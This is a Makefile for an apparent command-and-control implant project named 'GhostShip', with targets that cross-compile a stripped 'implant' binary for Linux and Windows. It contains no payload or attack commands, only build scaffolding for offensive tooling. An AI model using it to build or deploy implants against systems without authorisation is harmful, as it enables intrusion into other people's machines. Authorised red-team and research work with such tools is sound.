# GhostShip v1.0.0 "Omni Hardened"
# Professional P2P C2 Delivery Suite

.PHONY: help build-linux build-windows build-all clean fmt vet

# Colors for output
BOLD := \033[1m
GREEN := \033[0;32m
YELLOW := \033[1;33m
RED := \033[0;31m
NC := \033[0m

##@ General
help: ## Display this help message
	@awk 'BEGIN {FS = ":.*##"; printf "\n$(BOLD)Usage:$(NC)\n  make $(GREEN)<target>$(NC)\n"} /^[a-zA-Z_0-9-]+:.*?##/ { printf "  $(GREEN)%-20s$(NC) %s\n", $$1, $$2 } /^##@/ { printf "\n$(BOLD)%s$(NC)\n", substr($$0, 5) }' $(MAKEFILE_LIST)

##@ Build
build-linux: ## Build GhostShip for Linux (amd64)
	@echo "$(GREEN)Building GhostShip v1.0 Linux...$(NC)"
	@mkdir -p implant/dist
	@cd implant && GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o dist/ghostship-linux main.go
	@echo "$(GREEN)✓ dist/ghostship-linux$(NC)"

build-windows: ## Build GhostShip for Windows (amd64)
	@echo "$(GREEN)Building GhostShip v1.0 Windows...$(NC)"
	@mkdir -p implant/dist
	@cd implant && GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/ghostship-windows.exe main.go
	@echo "$(GREEN)✓ dist/ghostship-windows.exe$(NC)"

build-all: build-linux build-windows ## Build for all platforms

##@ Quality
fmt: ## Format Go code
	@go fmt ./...

vet: ## Run go vet
	@go vet ./...

test: ## Run basic tests
	@go test -v ./implant/...

##@ Cleanup
clean: ## Clean build artifacts
	@rm -rf implant/dist/*
	@echo "$(GREEN)✓ Fragments purged$(NC)"

version: ## Show version
	@cat VERSION
